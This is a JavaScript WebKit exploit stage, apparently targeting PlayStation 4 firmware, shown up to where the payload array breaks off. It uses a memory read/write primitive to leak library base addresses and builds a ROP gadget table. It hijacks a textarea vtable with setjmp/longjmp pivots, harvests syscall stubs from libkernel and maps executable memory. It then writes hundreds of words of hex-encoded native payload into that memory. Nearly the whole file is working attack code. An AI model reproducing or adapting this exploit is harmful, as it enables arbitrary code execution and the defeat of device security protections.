var p;
var chain;
var nogc = [];
var webKitBase;
var libSceLibcInternalBase;
var libKernelBase;

const OFFSET_WK_vtable_first_element    = 0x009A6040;
const OFFSET_WK_memset_import           = 0x00002458;
const OFFSET_WK___stack_chk_fail_import = 0x00002438;
const OFFSET_WK_setjmp_gadget_one       = 0x006D81F5;
const OFFSET_WK_setjmp_gadget_two       = 0x00288F83;
const OFFSET_WK_longjmp_gadget_one      = 0x006D81F5;
const OFFSET_WK_longjmp_gadget_two      = 0x00288F83;



const OFFSET_libcint_memset             = 0x000507D0;
const OFFSET_libcint_setjmp             = 0x000BE39C;
const OFFSET_libcint_longjmp            = 0x000BE3F6;

const OFFSET_lk___stack_chk_fail        = 0x00012AD0;
const OFFSET_lk_pthread_create_name_np  = 0x0001BB10;
const OFFSET_lk_pthread_exit            = 0x00019FD0;
const OFFSET_lk_pthread_self            = 0x0001D160;
const OFFSET_lk_pthread_setschedparam   = 0x0002AD70;

var syscalls = {};
var gadgets = {};
var gadgetmap = {
  "ret": 0x0000003C,
  "pop rdi": 0x0000835D,
  "pop rsi": 0x0003C987,
  "pop rdx": 0x00052B23,
  "pop rcx": 0x00026AFB,
  "pop r8": 0x00097D32,
  "pop r9": 0x005C6A81,
  "pop rax": 0x0001FA68,
  "pop rsp": 0x00078C62,

  "mov [rdi], rax": 0x000203E9,
  "mov [rdi], eax": 0x00020148,
  "mov [rdi], rsi": 0x000359F0,
  "cmp [rcx], edi": 0x0010DA31,

  "setne al": 0x00009000,
  "sete al": 0x0001E0C4,
  "setle al": 0x000CA7F6,
  "setl al": 0x005955AC,
  "setge al": 0x0061B262,
  "setg al": 0x000E4A37,
  "shl rax, 3": 0x005E8953,
  "add rax, rdx": 0x003D498C,
  "mov rax, [rax]": 0x0002E852,
  "inc dword [rax]": 0x003628DB,
  "infpoop": 0x0001386A
};

var textArea = document.createElement("textarea");

function stage2() {
  p = window.prim;
  p.launch_chain = launch_chain;
  p.malloc = malloc;
  p.malloc32 = malloc32;
  p.stringify = stringify;
  p.readString = readString;
  p.array_from_address = array_from_address;

  //pointer to vtable address
  var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
  //address of vtable
  var textAreaVtable = p.read8(textAreaVtPtr);
  //use address of 1st entry (in .text) to calculate webkitbase
  webKitBase = p.read8(textAreaVtable).sub32(OFFSET_WK_vtable_first_element);

  libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
  libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);

  libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

  for (var gadget in gadgetmap) {
    window.gadgets[gadget] = webKitBase.add32(gadgetmap[gadget]);
  }

  function get_jmptgt(address) {
    var instr = p.read4(address) & 0xFFFF;
    var offset = p.read4(address.add32(2));
    if (instr != 0x25FF) {
      return 0;
    }
    return address.add32(0x6 + offset);
  }

  function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  }

  function array_from_address(addr, size) {
    var og_array = new Uint32Array(0x1000);
    var og_array_i = p.leakval(og_array).add32(0x10);

    p.write8(og_array_i, addr);
    p.write4(og_array_i.add32(8), size);

    nogc.push(og_array);
    return og_array;
  }

  function stringify(str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xFF;
    }
    window.nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(0x10));
  }
  function readString(addr)
  {
    var byte = p.read4(addr);
    var str  = "";
    var i = 0;
    while (byte & 0xFF)
    {
      str += String.fromCharCode(byte & 0xFF);
      byte = p.read4(addr.add32(i));
      i++;
    }
    return str;
  }



  var fakeVtable_setjmp = p.malloc32(0x200);
  var fakeVtable_longjmp = p.malloc32(0x200);
  var original_context = p.malloc32(0x40);
  var modified_context = p.malloc32(0x40);

  p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
  p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_setjmp.add32(0x10), original_context);
  p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
  p.write8(fakeVtable_setjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
  p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
  p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
  p.write8(fakeVtable_longjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  function launch_chain(chain) {

    chain.push(window.gadgets["pop rdi"]);
    chain.push(original_context);
    chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

    p.write8(textAreaVtPtr, fakeVtable_setjmp);
    textArea.scrollLeft = 0x0;
    p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
    p.write8(modified_context.add32(0x10), chain.stack);
    p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))

    p.write8(textAreaVtPtr, fakeVtable_longjmp);
    textArea.scrollLeft = 0x0;
    p.write8(textAreaVtPtr, textAreaVtable);
  }

  var kview = new Uint8Array(0x1000);
  var kstr = p.leakval(kview).add32(0x10);
  var orig_kview_buf = p.read8(kstr);

  p.write8(kstr, window.libKernelBase);
  p.write4(kstr.add32(8), 0x40000);
  var countbytes;

  for (var i = 0; i < 0x40000; i++) {
    if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
      countbytes = i;
      break;
    }
  }
  p.write4(kstr.add32(8), countbytes + 32);
  var dview32 = new Uint32Array(1);
  var dview8 = new Uint8Array(dview32.buffer);
  for (var i = 0; i < countbytes; i++) {
    if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
      dview8[0] = kview[i + 3];
      dview8[1] = kview[i + 4];
      dview8[2] = kview[i + 5];
      dview8[3] = kview[i + 6];
      var syscallno = dview32[0];
      window.syscalls[syscallno] = window.libKernelBase.add32(i);
    }
  }
  p.write8(kstr, orig_kview_buf);
  chain = new rop();
  if (chain.syscall(23, 0).low != 0x0) {
    try {
      stage3();
    } catch (e) {
      alert(e);
    }
  } 
    
  var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
  var payload_writer = p.array_from_address(payload_buffer, 0xC0000);

  payload_writer[0] = 0x001454e9;
  payload_writer[1] = 0x55544100;
  payload_writer[2] = 0x0082b953;
  payload_writer[3] = 0x8148c000;
  payload_writer[4] = 0x000130ec;
  payload_writer[5] = 0xf5894800;
  payload_writer[6] = 0xc148320f;
  payload_writer[7] = 0xc74820e2;
  payload_writer[8] = 0x66382444;
  payload_writer[9] = 0x48000006;
  payload_writer[10] = 0x44c6d009;
  payload_writer[11] = 0xc67f1024;
  payload_writer[12] = 0x45112444;
  payload_writer[13] = 0x24748d48;
  payload_writer[14] = 0x2444c610;
  payload_writer[15] = 0x8d484c12;
  payload_writer[16] = 0xfffe40b8;
  payload_writer[17] = 0x2444c6ff;
  payload_writer[18] = 0x04ba4613;
  payload_writer[19] = 0x48000000;
  payload_writer[20] = 0x08244c89;
  payload_writer[21] = 0x2cbe15ff;
  payload_writer[22] = 0x8b4c0000;
  payload_writer[23] = 0x002cb705;
  payload_writer[24] = 0x48c08500;
  payload_writer[25] = 0x08244c8b;
  payload_writer[26] = 0x0589850f;
  payload_writer[27] = 0x320f0000;
  payload_writer[28] = 0x20e2c148;
  payload_writer[29] = 0x402444c6;
  payload_writer[30] = 0xd3894855;
  payload_writer[31] = 0x412444c6;
  payload_writer[32] = 0xc3094848;
  payload_writer[33] = 0x422444c6;
  payload_writer[34] = 0x2444c689;
  payload_writer[35] = 0x8d48e543;
  payload_writer[36] = 0xc6402474;
  payload_writer[37] = 0x53442444;
  payload_writer[38] = 0x70bb8d48;
  payload_writer[39] = 0xc6000bc5;
  payload_writer[40] = 0x48452444;
  payload_writer[41] = 0x00000cba;
  payload_writer[42] = 0x2444c600;
  payload_writer[43] = 0x8d4c8346;
  payload_writer[44] = 0xfffe40a3;
  payload_writer[45] = 0x2444c6ff;
  payload_writer[46] = 0x44c6ec47;
  payload_writer[47] = 0xc6584824;
  payload_writer[48] = 0x48492444;
  payload_writer[49] = 0x4a2444c6;
  payload_writer[50] = 0x2444c68d;
  payload_writer[51] = 0xff411d4b;
  payload_writer[52] = 0x75c085d0;
  payload_writer[53] = 0x44c74815;
  payload_writer[54] = 0x07003824;
  payload_writer[55] = 0x8d480000;
  payload_writer[56] = 0x02ef8083;
  payload_writer[57] = 0x0d4ee900;
  payload_writer[58] = 0x44c60000;
  payload_writer[59] = 0x48554c24;
  payload_writer[60] = 0x4c24748d;
  payload_writer[61] = 0x4d2444c6;
  payload_writer[62] = 0xbb8d4848;
  payload_writer[63] = 0x001230c0;
  payload_writer[64] = 0x4e2444c6;
  payload_writer[65] = 0x000cba89;
  payload_writer[66] = 0x44c60000;
  payload_writer[67] = 0xc6e54f24;
  payload_writer[68] = 0x53502444;
  payload_writer[69] = 0x512444c6;
  payload_writer[70] = 0x2444c648;
  payload_writer[71] = 0x44c68352;
  payload_writer[72] = 0xc6ec5324;
  payload_writer[73] = 0x58542444;
  payload_writer[74] = 0x552444c6;
  payload_writer[75] = 0x2444c648;
  payload_writer[76] = 0x44c68d56;
  payload_writer[77] = 0xff1d5724;
  payload_writer[78] = 0x002bdb15;
  payload_writer[79] = 0x75c08500;
  payload_writer[80] = 0x44c74815;
  payload_writer[81] = 0x06703824;
  payload_writer[82] = 0x8d480000;
  payload_writer[83] = 0x3c14f083;
  payload_writer[84] = 0x0ce2e900;
  payload_writer[85] = 0x44c60000;
  payload_writer[86] = 0x48555824;
  payload_writer[87] = 0x5824748d;
  payload_writer[88] = 0x592444c6;
  payload_writer[89] = 0xbb8d4848;
  payload_writer[90] = 0x00122d10;
  payload_writer[91] = 0x5a2444c6;
  payload_writer[92] = 0x000cba89;
  payload_writer[93] = 0x44c60000;
  payload_writer[94] = 0xc6e55b24;
  payload_writer[95] = 0x535c2444;
  payload_writer[96] = 0x5d2444c6;
  payload_writer[97] = 0x2444c648;
  payload_writer[98] = 0x44c6835e;
  payload_writer[99] = 0xc6ec5f24;
  payload_writer[100] = 0x58602444;
  payload_writer[101] = 0x612444c6;
  payload_writer[102] = 0x2444c648;
  payload_writer[103] = 0x44c68d62;
  payload_writer[104] = 0xff1d6324;
  payload_writer[105] = 0x002b6f15;
  payload_writer[106] = 0x75c08500;
  payload_writer[107] = 0x44c74815;
  payload_writer[108] = 0x06503824;
  payload_writer[109] = 0x8d480000;
  payload_writer[110] = 0x3c114083;
  payload_writer[111] = 0x0c76e900;
  payload_writer[112] = 0x44c60000;
  payload_writer[113] = 0x48556424;
  payload_writer[114] = 0x6424748d;
  payload_writer[115] = 0x652444c6;
  payload_writer[116] = 0xbb8d4848;
  payload_writer[117] = 0x00307c50;
  payload_writer[118] = 0x662444c6;
  payload_writer[119] = 0x000cba89;
  payload_writer[120] = 0x44c60000;
  payload_writer[121] = 0xc6e56724;
  payload_writer[122] = 0x53682444;
  payload_writer[123] = 0x692444c6;
  payload_writer[124] = 0x2444c648;
  payload_writer[125] = 0x44c6836a;
  payload_writer[126] = 0xc6ec6b24;
  payload_writer[127] = 0x586c2444;
  payload_writer[128] = 0x6d2444c6;
  payload_writer[129] = 0x2444c648;
  payload_writer[130] = 0x44c68d6e;
  payload_writer[131] = 0xff1d6f24;
  payload_writer[132] = 0x002b0315;
  payload_writer[133] = 0x75c08500;
  payload_writer[134] = 0x44c7480b;
  payload_writer[135] = 0x06203824;
  payload_writer[136] = 0x60eb0000;
  payload_writer[137] = 0x702444c6;
  payload_writer[138] = 0x748d4855;
  payload_writer[139] = 0x44c67024;
  payload_writer[140] = 0x48487124;
  payload_writer[141] = 0x7c30bb8d;
  payload_writer[142] = 0x44c60030;
  payload_writer[143] = 0xba897224;
  payload_writer[144] = 0x0000000c;
  payload_writer[145] = 0x732444c6;
  payload_writer[146] = 0x2444c6e5;
  payload_writer[147] = 0x44c65374;
  payload_writer[148] = 0xc6487524;
  payload_writer[149] = 0x83762444;
  payload_writer[150] = 0x772444c6;
  payload_writer[151] = 0x2444c6ec;
  payload_writer[152] = 0x44c65878;
  payload_writer[153] = 0xc6487924;
  payload_writer[154] = 0x8d7a2444;
  payload_writer[155] = 0x7b2444c6;
  payload_writer[156] = 0xa115ff1d;
  payload_writer[157] = 0x8500002a;
  payload_writer[158] = 0x481575c0;
  payload_writer[159] = 0x382444c7;
  payload_writer[160] = 0x00000600;
  payload_writer[161] = 0x40838d48;
  payload_writer[162] = 0xe9001146;
  payload_writer[163] = 0x00000ba8;
  payload_writer[164] = 0x7c2444c6;
  payload_writer[165] = 0x748d4855;
  payload_writer[166] = 0x44c67c24;
  payload_writer[167] = 0x48487d24;
  payload_writer[168] = 0xaf90bb8d;
  payload_writer[169] = 0x44c60011;
  payload_writer[170] = 0xba897e24;
  payload_writer[171] = 0x0000000c;
  payload_writer[172] = 0x7f2444c6;
  payload_writer[173] = 0x2484c6e5;
  payload_writer[174] = 0x00000080;
  payload_writer[175] = 0x2484c653;
  payload_writer[176] = 0x00000081;
  payload_writer[177] = 0x2484c648;
  payload_writer[178] = 0x00000082;
  payload_writer[179] = 0x2484c683;
  payload_writer[180] = 0x00000083;
  payload_writer[181] = 0x2484c6ec;
  payload_writer[182] = 0x00000084;
  payload_writer[183] = 0x2484c658;
  payload_writer[184] = 0x00000085;
  payload_writer[185] = 0x2484c648;
  payload_writer[186] = 0x00000086;
  payload_writer[187] = 0x2484c68d;
  payload_writer[188] = 0x00000087;
  payload_writer[189] = 0x1d15ff1d;
  payload_writer[190] = 0x8500002a;
  payload_writer[191] = 0x481575c0;
  payload_writer[192] = 0x382444c7;
  payload_writer[193] = 0x00000555;
  payload_writer[194] = 0xc0838d48;
  payload_writer[195] = 0xe900405b;
  payload_writer[196] = 0x00000b24;
  payload_writer[197] = 0x882484c6;
  payload_writer[198] = 0x55000000;
  payload_writer[199] = 0x24b48d48;
  payload_writer[200] = 0x00000088;
  payload_writer[201] = 0x892484c6;
  payload_writer[202] = 0x48000000;
  payload_writer[203] = 0x20bb8d48;
  payload_writer[204] = 0xc60011ac;
  payload_writer[205] = 0x008a2484;
  payload_writer[206] = 0xba890000;
  payload_writer[207] = 0x0000000c;
  payload_writer[208] = 0x8b2484c6;
  payload_writer[209] = 0xe5000000;
  payload_writer[210] = 0x8c2484c6;
  payload_writer[211] = 0x53000000;
  payload_writer[212] = 0x8d2484c6;
  payload_writer[213] = 0x48000000;
  payload_writer[214] = 0x8e2484c6;
  payload_writer[215] = 0x83000000;
  payload_writer[216] = 0x8f2484c6;
  payload_writer[217] = 0xec000000;
  payload_writer[218] = 0x902484c6;
  payload_writer[219] = 0x58000000;
  payload_writer[220] = 0x912484c6;
  payload_writer[221] = 0x48000000;
  payload_writer[222] = 0x922484c6;
  payload_writer[223] = 0x8d000000;
  payload_writer[224] = 0x932484c6;
  payload_writer[225] = 0x1d000000;
  payload_writer[226] = 0x298a15ff;
  payload_writer[227] = 0xc0850000;
  payload_writer[228] = 0xc7481575;
  payload_writer[229] = 0x53382444;
  payload_writer[230] = 0x48000005;
  payload_writer[231] = 0x5800838d;
  payload_writer[232] = 0x91e90040;
  payload_writer[233] = 0xc600000a;
  payload_writer[234] = 0x00942484;
  payload_writer[235] = 0x48550000;
  payload_writer[236] = 0x9424b48d;
  payload_writer[237] = 0xc6000000;
  payload_writer[238] = 0x00952484;
  payload_writer[239] = 0x48480000;
  payload_writer[240] = 0xac50bb8d;
  payload_writer[241] = 0x84c60011;
  payload_writer[242] = 0x00009624;
  payload_writer[243] = 0x0cba8900;
  payload_writer[244] = 0xc6000000;
  payload_writer[245] = 0x00972484;
  payload_writer[246] = 0xc6e50000;
  payload_writer[247] = 0x00982484;
  payload_writer[248] = 0xc6530000;
  payload_writer[249] = 0x00992484;
  payload_writer[250] = 0xc6480000;
  payload_writer[251] = 0x009a2484;
  payload_writer[252] = 0xc6830000;
  payload_writer[253] = 0x009b2484;
  payload_writer[254] = 0xc6ec0000;
  payload_writer[255] = 0x009c2484;
  payload_writer[256] = 0xc6580000;
  payload_writer[257] = 0x009d2484;
  payload_writer[258] = 0xc6480000;
  payload_writer[259] = 0x009e2484;
  payload_writer[260] = 0xc68d0000;
  payload_writer[261] = 0x009f2484;
  payload_writer[262] = 0xff1d0000;
  payload_writer[263] = 0x0028f715;
  payload_writer[264] = 0x75c08500;
  payload_writer[265] = 0x44c74815;
  payload_writer[266] = 0x05503824;
  payload_writer[267] = 0x8d480000;
  payload_writer[268] = 0x40590083;
  payload_writer[269] = 0x09fee900;
  payload_writer[270] = 0x84c60000;
  payload_writer[271] = 0x0000a024;
  payload_writer[272] = 0x8d485500;
  payload_writer[273] = 0x00a024b4;
  payload_writer[274] = 0x84c60000;
  payload_writer[275] = 0x0000a124;
  payload_writer[276] = 0x8d484800;
  payload_writer[277] = 0x435e80bb;
  payload_writer[278] = 0x2484c600;
  payload_writer[279] = 0x000000a2;
  payload_writer[280] = 0x000cba89;
  payload_writer[281] = 0x84c60000;
  payload_writer[282] = 0x0000a324;
  payload_writer[283] = 0x84c6e500;
  payload_writer[284] = 0x0000a424;
  payload_writer[285] = 0x84c65300;
  payload_writer[286] = 0x0000a524;
  payload_writer[287] = 0x84c64800;
  payload_writer[288] = 0x0000a624;
  payload_writer[289] = 0x84c68300;
  payload_writer[290] = 0x0000a724;
  payload_writer[291] = 0x84c6ec00;
  payload_writer[292] = 0x0000a824;
  payload_writer[293] = 0x84c65800;
  payload_writer[294] = 0x0000a924;
  payload_writer[295] = 0x84c64800;
  payload_writer[296] = 0x0000aa24;
  payload_writer[297] = 0x84c68d00;
  payload_writer[298] = 0x0000ab24;
  payload_writer[299] = 0x15ff1d00;
  payload_writer[300] = 0x00002864;
  payload_writer[301] = 0x0e75c085;
  payload_writer[302] = 0x2444c748;
  payload_writer[303] = 0x00050538;
  payload_writer[304] = 0x0088e900;
  payload_writer[305] = 0x84c60000;
  payload_writer[306] = 0x0000ac24;
  payload_writer[307] = 0x8d485500;
  payload_writer[308] = 0x00ac24b4;
  payload_writer[309] = 0x84c60000;
  payload_writer[310] = 0x0000ad24;
  payload_writer[311] = 0x8d494800;
  payload_writer[312] = 0x600024bc;
  payload_writer[313] = 0x84c60043;
  payload_writer[314] = 0x0000ae24;
  payload_writer[315] = 0x0cba8900;
  payload_writer[316] = 0xc6000000;
  payload_writer[317] = 0x00af2484;
  payload_writer[318] = 0xc6e50000;
  payload_writer[319] = 0x00b02484;
  payload_writer[320] = 0xc6530000;
  payload_writer[321] = 0x00b12484;
  payload_writer[322] = 0xc6480000;
  payload_writer[323] = 0x00b22484;
  payload_writer[324] = 0xc6830000;
  payload_writer[325] = 0x00b32484;
  payload_writer[326] = 0xc6ec0000;
  payload_writer[327] = 0x00b42484;
  payload_writer[328] = 0xc6580000;
  payload_writer[329] = 0x00b52484;
  payload_writer[330] = 0xc6480000;
  payload_writer[331] = 0x00b62484;
  payload_writer[332] = 0xc68d0000;
  payload_writer[333] = 0x00b72484;
  payload_writer[334] = 0xff1d0000;
  payload_writer[335] = 0x0027d715;
  payload_writer[336] = 0x75c08500;
  payload_writer[337] = 0x44c74816;
  payload_writer[338] = 0x05033824;
  payload_writer[339] = 0x8d490000;
  payload_writer[340] = 0xa6302484;
  payload_writer[341] = 0xdde9001e;
  payload_writer[342] = 0xc6000008;
  payload_writer[343] = 0x00b82484;
  payload_writer[344] = 0x48550000;
  payload_writer[345] = 0xb824b48d;
  payload_writer[346] = 0xc6000000;
  payload_writer[347] = 0x00b92484;
  payload_writer[348] = 0x49480000;
  payload_writer[349] = 0x7024bc8d;
  payload_writer[350] = 0xc600435c;
  payload_writer[351] = 0x00ba2484;
  payload_writer[352] = 0xba890000;
  payload_writer[353] = 0x0000000c;
  payload_writer[354] = 0xbb2484c6;
  payload_writer[355] = 0xe5000000;
  payload_writer[356] = 0xbc2484c6;
  payload_writer[357] = 0x53000000;
  payload_writer[358] = 0xbd2484c6;
  payload_writer[359] = 0x48000000;
  payload_writer[360] = 0xbe2484c6;
  payload_writer[361] = 0x83000000;
  payload_writer[362] = 0xbf2484c6;
  payload_writer[363] = 0xec000000;
  payload_writer[364] = 0xc02484c6;
  payload_writer[365] = 0x58000000;
  payload_writer[366] = 0xc12484c6;
  payload_writer[367] = 0x48000000;
  payload_writer[368] = 0xc22484c6;
  payload_writer[369] = 0x8d000000;
  payload_writer[370] = 0xc32484c6;
  payload_writer[371] = 0x1d000000;
  payload_writer[372] = 0x274215ff;
  payload_writer[373] = 0xc0850000;
  payload_writer[374] = 0xc0310774;
  payload_writer[375] = 0x000857e9;
  payload_writer[376] = 0x44c74800;
  payload_writer[377] = 0x05003824;
  payload_writer[378] = 0x8d490000;
  payload_writer[379] = 0xa5202484;
  payload_writer[380] = 0x41e9001e;
  payload_writer[381] = 0x0f000008;
  payload_writer[382] = 0xe2c14832;
  payload_writer[383] = 0x2444c620;
  payload_writer[384] = 0x09487f14;
  payload_writer[385] = 0x2444c6d0;
  payload_writer[386] = 0x44c64515;
  payload_writer[387] = 0x484c1624;
  payload_writer[388] = 0x1424748d;
  payload_writer[389] = 0x172444c6;
  payload_writer[390] = 0xb88d4846;
  payload_writer[391] = 0xffcf47c0;
  payload_writer[392] = 0x244c8948;
  payload_writer[393] = 0x0004ba08;
  payload_writer[394] = 0xff410000;
  payload_writer[395] = 0x058b4cd0;
  payload_writer[396] = 0x000026e4;
  payload_writer[397] = 0x8b48c085;
  payload_writer[398] = 0x0f08244c;
  payload_writer[399] = 0x00009d85;
  payload_writer[400] = 0x48320f00;
  payload_writer[401] = 0xc620e2c1;
  payload_writer[402] = 0x00c42484;
  payload_writer[403] = 0x48550000;
  payload_writer[404] = 0x84c6d009;
  payload_writer[405] = 0x0000c524;
  payload_writer[406] = 0x8d484800;
  payload_writer[407] = 0xcf47c098;
  payload_writer[408] = 0x2484c6ff;
  payload_writer[409] = 0x000000c6;
  payload_writer[410] = 0x2484c689;
  payload_writer[411] = 0x000000c7;
  payload_writer[412] = 0xb48d48e5;
  payload_writer[413] = 0x0000c424;
  payload_writer[414] = 0x2484c600;
  payload_writer[415] = 0x000000c8;
  payload_writer[416] = 0xbb8d4853;
  payload_writer[417] = 0x00017f30;
  payload_writer[418] = 0xc92484c6;
  payload_writer[419] = 0x48000000;
  payload_writer[420] = 0x00000cba;
  payload_writer[421] = 0x2484c600;
  payload_writer[422] = 0x000000ca;
  payload_writer[423] = 0x2484c683;
  payload_writer[424] = 0x000000cb;
  payload_writer[425] = 0x2484c6ec;
  payload_writer[426] = 0x000000cc;
  payload_writer[427] = 0x2484c658;
  payload_writer[428] = 0x000000cd;
  payload_writer[429] = 0x2484c648;
  payload_writer[430] = 0x000000ce;
  payload_writer[431] = 0x2484c68d;
  payload_writer[432] = 0x000000cf;
  payload_writer[433] = 0xd0ff411d;
  payload_writer[434] = 0x850fc085;
  payload_writer[435] = 0xffffff0a;
  payload_writer[436] = 0x2444c748;
  payload_writer[437] = 0x00047038;
  payload_writer[438] = 0x00e2e900;
  payload_writer[439] = 0x320f0000;
  payload_writer[440] = 0x20e2c148;
  payload_writer[441] = 0x182444c6;
  payload_writer[442] = 0xd009487f;
  payload_writer[443] = 0x192444c6;
  payload_writer[444] = 0x2444c645;
  payload_writer[445] = 0x8d484c1a;
  payload_writer[446] = 0xc6182474;
  payload_writer[447] = 0x461b2444;
  payload_writer[448] = 0x30b88d48;
  payload_writer[449] = 0x48ffcf48;
  payload_writer[450] = 0x08244c89;
  payload_writer[451] = 0x000004ba;
  payload_writer[452] = 0xd0ff4100;
  payload_writer[453] = 0xfd058b4c;
  payload_writer[454] = 0x85000025;
  payload_writer[455] = 0x4c8b48c0;
  payload_writer[456] = 0x850f0824;
  payload_writer[457] = 0x000000a4;
  payload_writer[458] = 0xc148320f;
  payload_writer[459] = 0x84c620e2;
  payload_writer[460] = 0x0000d024;
  payload_writer[461] = 0x09485500;
  payload_writer[462] = 0x2484c6d0;
  payload_writer[463] = 0x000000d1;
  payload_writer[464] = 0x988d4848;
  payload_writer[465] = 0xffcf4830;
  payload_writer[466] = 0xd22484c6;
  payload_writer[467] = 0x89000000;
  payload_writer[468] = 0xd32484c6;
  payload_writer[469] = 0xe5000000;
  payload_writer[470] = 0x24b48d48;
  payload_writer[471] = 0x000000d0;
  payload_writer[472] = 0xd42484c6;
  payload_writer[473] = 0x53000000;
  payload_writer[474] = 0x30bb8d48;
  payload_writer[475] = 0xc600017f;
  payload_writer[476] = 0x00d52484;
  payload_writer[477] = 0xba480000;
  payload_writer[478] = 0x0000000c;
  payload_writer[479] = 0xd62484c6;
  payload_writer[480] = 0x83000000;
  payload_writer[481] = 0xd72484c6;
  payload_writer[482] = 0xec000000;
  payload_writer[483] = 0xd82484c6;
  payload_writer[484] = 0x58000000;
  payload_writer[485] = 0xd92484c6;
  payload_writer[486] = 0x48000000;
  payload_writer[487] = 0xda2484c6;
  payload_writer[488] = 0x8d000000;
  payload_writer[489] = 0xdb2484c6;
  payload_writer[490] = 0x1d000000;
  payload_writer[491] = 0x85d0ff41;
  payload_writer[492] = 0x23850fc0;
  payload_writer[493] = 0x48fffffe;
  payload_writer[494] = 0x382444c7;
  payload_writer[495] = 0x00000471;
  payload_writer[496] = 0x40838d48;
  payload_writer[497] = 0xe900149e;
  payload_writer[498] = 0x0000066c;
  payload_writer[499] = 0xc148320f;
  payload_writer[500] = 0x44c620e2;
  payload_writer[501] = 0x487f1c24;
  payload_writer[502] = 0x44c6d009;
  payload_writer[503] = 0xc6451d24;
  payload_writer[504] = 0x4c1e2444;
  payload_writer[505] = 0x24748d48;
  payload_writer[506] = 0x2444c61c;
  payload_writer[507] = 0x8d48461f;
  payload_writer[508] = 0xcf6a30b8;
  payload_writer[509] = 0x4c8948ff;
  payload_writer[510] = 0x04ba0824;
  payload_writer[511] = 0x41000000;
  payload_writer[512] = 0x8b4cd0ff;
  payload_writer[513] = 0x00250f05;
  payload_writer[514] = 0x48c08500;
  payload_writer[515] = 0x08244c8b;
  payload_writer[516] = 0x00a4850f;
  payload_writer[517] = 0x320f0000;
  payload_writer[518] = 0x20e2c148;
  payload_writer[519] = 0xdc2484c6;
  payload_writer[520] = 0x55000000;
  payload_writer[521] = 0xc6d00948;
  payload_writer[522] = 0x00dd2484;
  payload_writer[523] = 0x48480000;
  payload_writer[524] = 0x6a30988d;
  payload_writer[525] = 0x84c6ffcf;
  payload_writer[526] = 0x0000de24;
  payload_writer[527] = 0x84c68900;
  payload_writer[528] = 0x0000df24;
  payload_writer[529] = 0x8d48e500;
  payload_writer[530] = 0x00dc24b4;
  payload_writer[531] = 0x84c60000;
  payload_writer[532] = 0x0000e024;
  payload_writer[533] = 0x8d485300;
  payload_writer[534] = 0x017f30bb;
  payload_writer[535] = 0x2484c600;
  payload_writer[536] = 0x000000e1;
  payload_writer[537] = 0x000cba48;
  payload_writer[538] = 0x84c60000;
  payload_writer[539] = 0x0000e224;
  payload_writer[540] = 0x84c68300;
  payload_writer[541] = 0x0000e324;
  payload_writer[542] = 0x84c6ec00;
  payload_writer[543] = 0x0000e424;
  payload_writer[544] = 0x84c65800;
  payload_writer[545] = 0x0000e524;
  payload_writer[546] = 0x84c64800;
  payload_writer[547] = 0x0000e624;
  payload_writer[548] = 0x84c68d00;
  payload_writer[549] = 0x0000e724;
  payload_writer[550] = 0xff411d00;
  payload_writer[551] = 0x0fc085d0;
  payload_writer[552] = 0xfffd3585;
  payload_writer[553] = 0x44c748ff;
  payload_writer[554] = 0x04503824;
  payload_writer[555] = 0x8d480000;
  payload_writer[556] = 0x14a7b083;
  payload_writer[557] = 0x057ee900;
  payload_writer[558] = 0x320f0000;
  payload_writer[559] = 0x20e2c148;
  payload_writer[560] = 0x202444c6;
  payload_writer[561] = 0xd009487f;
  payload_writer[562] = 0x212444c6;
  payload_writer[563] = 0x2444c645;
  payload_writer[564] = 0x8d484c22;
  payload_writer[565] = 0xc6202474;
  payload_writer[566] = 0x46232444;
  payload_writer[567] = 0xc0b88d48;
  payload_writer[568] = 0x48ffcf14;
  payload_writer[569] = 0x08244c89;
  payload_writer[570] = 0x000004ba;
  payload_writer[571] = 0xd0ff4100;
  payload_writer[572] = 0x21058b4c;
  payload_writer[573] = 0x85000024;
  payload_writer[574] = 0x4c8b48c0;
